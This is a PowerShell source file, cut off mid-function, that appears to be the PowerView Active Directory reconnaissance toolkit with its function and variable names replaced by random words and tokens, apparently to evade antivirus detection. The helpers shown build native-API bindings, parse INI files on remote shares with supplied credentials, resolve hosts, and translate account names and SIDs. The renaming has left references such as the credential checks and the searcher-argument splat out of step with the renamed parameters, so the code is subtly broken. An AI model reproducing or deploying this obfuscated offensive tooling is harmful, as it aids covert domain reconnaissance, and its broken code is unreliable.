


function Darwin {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $mKFpQkuL99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $jtWNKIiJ99 = $mKFpQkuL99.GetAssemblies()

    foreach ($mUvLSUFk99 in $jtWNKIiJ99) {
        if ($mUvLSUFk99.FullName -and ($mUvLSUFk99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $mUvLSUFk99
        }
    }

    $UesaoaLo99 = New-Object Reflection.AssemblyName($ModuleName)
    $XQOKQXGr99 = $mKFpQkuL99
    $basveOwT99 = $XQOKQXGr99.DefineDynamicAssembly($UesaoaLo99, 'Run')
    $khtlhvCo99 = $basveOwT99.DefineDynamicModule($ModuleName, $False)

    return $khtlhvCo99
}


function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $MkrVNaWX99,

        [Switch]
        $SetLastError
    )

    $kaLEgole99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $kaLEgole99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $kaLEgole99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $kaLEgole99['Charset'] = $Charset }
    if ($SetLastError) { $kaLEgole99['SetLastError'] = $SetLastError }
    if ($MkrVNaWX99) { $kaLEgole99['EntryPoint'] = $MkrVNaWX99 }

    New-Object PSObject -Property $kaLEgole99
}


function ravelled
{

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $MkrVNaWX99,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $ZKNMzbUN99 = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $ZKNMzbUN99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $ZKNMzbUN99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$ZKNMzbUN99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $ZKNMzbUN99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $ZKNMzbUN99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $RotDAwGI99 = $ZKNMzbUN99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            $i = 1
            foreach($DDxpHMKP99 in $ParameterTypes)
            {
                if ($DDxpHMKP99.IsByRef)
                {
                    [void] $RotDAwGI99.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $ThsAPxyR99 = [Runtime.InteropServices.DllImportAttribute]
            $trPYFMOY99 = $ThsAPxyR99.GetField('SetLastError')
            $TEatCTTW99 = $ThsAPxyR99.GetField('CallingConvention')
            $uiAOvZtB99 = $ThsAPxyR99.GetField('CharSet')
            $gAKfNUME99 = $ThsAPxyR99.GetField('EntryPoint')
            if ($SetLastError) { $cFLSNgOB99 = $True } else { $cFLSNgOB99 = $False }

            if ($PSBoundParameters['EntryPoint']) { $rbVgXzog99 = $MkrVNaWX99 } else { $rbVgXzog99 = $FunctionName }

            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $RqNkFRgC99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($trPYFMOY99,
                                           $TEatCTTW99,
                                           $uiAOvZtB99,
                                           $gAKfNUME99),
                [Object[]] @($cFLSNgOB99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $rbVgXzog99))

            $RotDAwGI99.SetCustomAttribute($RqNkFRgC99)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $ZKNMzbUN99
        }

        $eamWuGUb99 = @{}

        foreach ($Key in $ZKNMzbUN99.Keys)
        {
            $Type = $ZKNMzbUN99[$Key].CreateType()

            $eamWuGUb99[$Key] = $Type
        }

        return $eamWuGUb99
    }
}


function foreleg {

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZzmlrabR99,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $HRCrmsjH99,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($ZzmlrabR99))
    }

    $ywRKeOdi99 = $Type -as [Type]

    $LseknvsF99 = $Module.DefineEnum($ZzmlrabR99, 'Public', $ywRKeOdi99)

    if ($Bitfield)
    {
        $QDUNjnUb99 = [FlagsAttribute].GetConstructor(@())
        $rgQNcJsF99 = New-Object Reflection.Emit.CustomAttributeBuilder($QDUNjnUb99, @())
        $LseknvsF99.SetCustomAttribute($rgQNcJsF99)
    }

    foreach ($Key in $HRCrmsjH99.Keys)
    {
        $null = $LseknvsF99.DefineLiteral($Key, $HRCrmsjH99[$Key] -as $ywRKeOdi99)
    }

    $LseknvsF99.CreateType()
}


function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $mJunaOjy99,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $edhaIdNu99,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $mJunaOjy99
        Type = $Type -as [Type]
        Offset = $edhaIdNu99
        MarshalAs = $MarshalAs
    }
}


function exculpated
{

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZzmlrabR99,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $CeajDJpz99,

        [Reflection.Emit.PackingSize]
        $wrmTfyWj99 = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $rzkvPEld99
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($ZzmlrabR99))
    }

    [Reflection.TypeAttributes] $QEhmjlPF99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($rzkvPEld99)
    {
        $QEhmjlPF99 = $QEhmjlPF99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $QEhmjlPF99 = $QEhmjlPF99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $FZMezlxP99 = $Module.DefineType($ZzmlrabR99, $QEhmjlPF99, [ValueType], $wrmTfyWj99)
    $JTJQuHEF99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $QLVJeMoc99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $uzrKiAvm99 = New-Object Hashtable[]($CeajDJpz99.Count)

    foreach ($Field in $CeajDJpz99.Keys)
    {
        $Index = $CeajDJpz99[$Field]['Position']
        $uzrKiAvm99[$Index] = @{FieldName = $Field; Properties = $CeajDJpz99[$Field]}
    }

    foreach ($Field in $uzrKiAvm99)
    {
        $tOaztlff99 = $Field['FieldName']
        $ECYVnLls99 = $Field['Properties']

        $edhaIdNu99 = $ECYVnLls99['Offset']
        $Type = $ECYVnLls99['Type']
        $MarshalAs = $ECYVnLls99['MarshalAs']

        $tynFQpmE99 = $FZMezlxP99.DefineField($tOaztlff99, $Type, 'Public')

        if ($MarshalAs)
        {
            $CWrHTWXg99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $MROfPFOd99 = New-Object Reflection.Emit.CustomAttributeBuilder($JTJQuHEF99,
                    $CWrHTWXg99, $QLVJeMoc99, @($Size))
            }
            else
            {
                $MROfPFOd99 = New-Object Reflection.Emit.CustomAttributeBuilder($JTJQuHEF99, [Object[]] @($CWrHTWXg99))
            }

            $tynFQpmE99.SetCustomAttribute($MROfPFOd99)
        }

        if ($rzkvPEld99) { $tynFQpmE99.SetOffset($edhaIdNu99) }
    }

    $cmWGmKHr99 = $FZMezlxP99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $AdCGmKkI99 = $cmWGmKHr99.GetILGenerator()
    $AdCGmKkI99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $FZMezlxP99)
    $AdCGmKkI99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $AdCGmKkI99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $AdCGmKkI99.Emit([Reflection.Emit.OpCodes]::Ret)

    $cHuzTWJn99 = $FZMezlxP99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $FZMezlxP99,
        [Type[]] @([IntPtr]))
    $LyednWxr99 = $cHuzTWJn99.GetILGenerator()
    $LyednWxr99.Emit([Reflection.Emit.OpCodes]::Nop)
    $LyednWxr99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $LyednWxr99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $FZMezlxP99)
    $LyednWxr99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $LyednWxr99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $LyednWxr99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $FZMezlxP99)
    $LyednWxr99.Emit([Reflection.Emit.OpCodes]::Ret)

    $FZMezlxP99.CreateType()
}



Function prostrates {

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$itCiaKLz99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$mJunaOjy99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$pFhWxGkE99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$tmMhJPnr99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$CEeOafgA99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$CLSJqrcX99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$KTXLdRCy99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$QIxUvbAb99 = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$MVhCXNDV99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$aERuJCsI99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$hImowWzr99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$HAKisnWJ99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$sDysUnzd99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$sdrCrdsA99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$YHqgWVDo99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$cMkPvbRS99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$PGVtCqfG99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ydpFQPrN99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$TVGxsQnM99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $JlcVygqV99 = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$rgjbmZdj99,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $bKctLDxk99
    )

    Begin {
        $oHcqTSga99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $oGvrWTof99 = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($rgjbmZdj99) {
            $kyfGBCNH99 = $bKctLDxk99.Keys | Where-Object { $oGvrWTof99 -notcontains $_ }
            ForEach($DDxpHMKP99 in $kyfGBCNH99) {
                if ($DDxpHMKP99) {
                    Set-Variable -Name $DDxpHMKP99 -Value $bKctLDxk99.$DDxpHMKP99 -Scope 1 -Force
                }
            }
        }
        else {
            $YuAeYfim99 = @()
            $YuAeYfim99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($YuAeYfim99) {
                $YuAeYfim99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            $FaovnNYV99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            $tmp = $null
            ForEach ($DDxpHMKP99 in $FaovnNYV99) {
                $eYXeOmqj99 = Get-Variable -Name $DDxpHMKP99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($DDxpHMKP99, [ref]$tmp) -and $eYXeOmqj99) {
                    $PSBoundParameters.$DDxpHMKP99 = $eYXeOmqj99
                }
            }

            if($JlcVygqV99) {
                $GQuFpkff99 = $JlcVygqV99
            }
            else {
                $GQuFpkff99 = $oHcqTSga99
            }

            $GwHtnDew99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            $OIUcKaQQ99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $BuMkSrzn99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $okfeTqsh99 = '^Alias$'
            $gVQaupXd99 = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $OIUcKaQQ99 {
                    Try {
                        $gVQaupXd99.$_ = . $GwHtnDew99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($GQuFpkff99.Keys -contains $Name) {
                $GQuFpkff99.$Name.Attributes.Add($gVQaupXd99)
            }
            else {
                $gfOUjTSH99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $BuMkSrzn99 {
                        Try {
                            $VgwyIDAZ99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GwHtnDew99) -ErrorAction Stop
                            $gfOUjTSH99.Add($VgwyIDAZ99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $okfeTqsh99 {
                        Try {
                            $ShPmZnHI99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GwHtnDew99) -ErrorAction Stop
                            $gfOUjTSH99.Add($ShPmZnHI99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $gfOUjTSH99.Add($gVQaupXd99)
                $DDxpHMKP99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $gfOUjTSH99)
                $GQuFpkff99.Add($Name, $DDxpHMKP99)
            }
        }
    }

    End {
        if(!$rgjbmZdj99 -and !$JlcVygqV99) {
            $GQuFpkff99
        }
    }
}


function overseers {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $hFzNOQje99
    )

    BEGIN {
        $rdBTKSlm99 = @{}
    }

    PROCESS {
        ForEach ($rSjMYowK99 in $Path) {
            if (($rSjMYowK99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $GhoLUzNa99 = (New-Object System.Uri($rSjMYowK99)).Host
                if (-not $rdBTKSlm99[$GhoLUzNa99]) {
                    crinkling -wkNUqpQt99 $GhoLUzNa99 -ZiReXCQu99 $ZiReXCQu99
                    $rdBTKSlm99[$GhoLUzNa99] = $True
                }
            }

            if (Test-Path -Path $rSjMYowK99) {
                if ($PSBoundParameters['OutputObject']) {
                    $fiLMQQBw99 = New-Object PSObject
                }
                else {
                    $fiLMQQBw99 = @{}
                }
                Switch -Regex -File $rSjMYowK99 {
                    "^\[(.+)\]" # Section
                    {
                        $AehZLxUw99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $AehZLxUw99 = $AehZLxUw99.Replace(' ', '')
                            $CDfgIZpI99 = New-Object PSObject
                            $fiLMQQBw99 | Add-Member Noteproperty $AehZLxUw99 $CDfgIZpI99
                        }
                        else {
                            $fiLMQQBw99[$AehZLxUw99] = @{}
                        }
                        $BBsYkPKY99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $BBsYkPKY99 = $BBsYkPKY99 + 1
                        $Name = 'Comment' + $BBsYkPKY99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $fiLMQQBw99.$AehZLxUw99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $fiLMQQBw99[$AehZLxUw99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $YpbcLwMZ99 = $Value.split(',') | ForEach-Object { $_.Trim() }


                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $fiLMQQBw99.$AehZLxUw99 | Add-Member Noteproperty $Name $YpbcLwMZ99
                        }
                        else {
                            $fiLMQQBw99[$AehZLxUw99][$Name] = $YpbcLwMZ99
                        }
                    }
                }
                $fiLMQQBw99
            }
        }
    }

    END {
        $rdBTKSlm99.Keys | eraser
    }
}


function contralto {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $PMIEavdF99,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $dXwGdNVV99 = ',',

        [Switch]
        $daFaYhSn99
    )

    BEGIN {
        $KOXiWdeq99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $RIoPzkPM99 = [System.IO.File]::Exists($KOXiWdeq99)

        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $eOMOLSsK99 = [System.IO.FileMode]::Append
        }
        else {
            $eOMOLSsK99 = [System.IO.FileMode]::Create
            $RIoPzkPM99 = $False
        }

        $nmjXMkIJ99 = New-Object IO.FileStream($KOXiWdeq99, $eOMOLSsK99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $nwLZrHME99 = New-Object System.IO.StreamWriter($nmjXMkIJ99)
        $nwLZrHME99.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $PMIEavdF99) {
            $pQcZNkUe99 = ConvertTo-Csv -PMIEavdF99 $Entry -dXwGdNVV99 $dXwGdNVV99 -NoTypeInformation

            if (-not $RIoPzkPM99) {
                $pQcZNkUe99 | ForEach-Object { $nwLZrHME99.WriteLine($_) }
                $RIoPzkPM99 = $True
            }
            else {
                $pQcZNkUe99[1..($pQcZNkUe99.Length-1)] | ForEach-Object { $nwLZrHME99.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $nwLZrHME99.Dispose()
        $nmjXMkIJ99.Dispose()
    }
}


function jocular {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            try {
                @(([Net.Dns]::GetHostEntry($LqojfQUN99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[jocular] Could not resolve $LqojfQUN99 to an IP Address."
            }
        }
    }
}


function imprison {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $prIHNbyB99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wETomCIE99 = @{}
        if ($PSBoundParameters['Domain']) { $wETomCIE99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $wETomCIE99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Credential']) { $wETomCIE99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        ForEach ($Object in $prIHNbyB99) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = jiggering -aCzrnrLk99 $Object -hKoxCyte99 'DN' @DomainSearcherArguments
                if ($DN) {
                    $tpoFORKS99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $OpgheHcJ99 = $DN.Split(',')[0].split('=')[1]

                    $wETomCIE99['Identity'] = $OpgheHcJ99
                    $wETomCIE99['Domain'] = $tpoFORKS99
                    $wETomCIE99['Properties'] = 'objectsid'
                    grow @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $XQOKQXGr99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $wETomCIE99 = @{}
                        $XQOKQXGr99 = (philately @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($XQOKQXGr99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[imprison] Error converting $XQOKQXGr99\$Object : $_"
                }
            }
        }
    }
}


function retrain {

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $LGhgaolH99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $QiaDxgyH99 = @{}
        if ($PSBoundParameters['Domain']) { $QiaDxgyH99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $QiaDxgyH99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Credential']) { $QiaDxgyH99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        ForEach ($UZgPkOzH99 in $LGhgaolH99) {
            $UZgPkOzH99 = $UZgPkOzH99.trim('*')
            try {
                Switch ($UZgPkOzH99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
